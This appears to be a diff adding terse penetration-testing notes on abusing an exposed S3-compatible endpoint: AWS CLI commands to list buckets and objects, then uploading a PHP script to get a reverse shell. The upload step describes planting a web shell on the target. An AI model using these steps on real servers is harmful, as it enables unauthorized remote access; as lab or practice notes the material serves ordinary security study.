@@ -1,0 +1,15 @@
+if we got an s3 bucket we got the infotext in json
+
+"{status : running}
+
+We can list all of the S3 buckets hosted by the server by using the ls command.
+
+                                                                            -- aws --endpoint=http://s3.(domain) s3 ls
+
+We can also use the ls command to list objects and common prefixes under the specified bucket.
+
+                                                                            -- aws --endpoint=http://s3.(Domain) s3 ls s3://(Domain)
+
+php file Upload vie aws for revshell
+
+                                                                            -- aws --endpoint=http://s3.(Domain) s3 cp script.php s3://(domain)
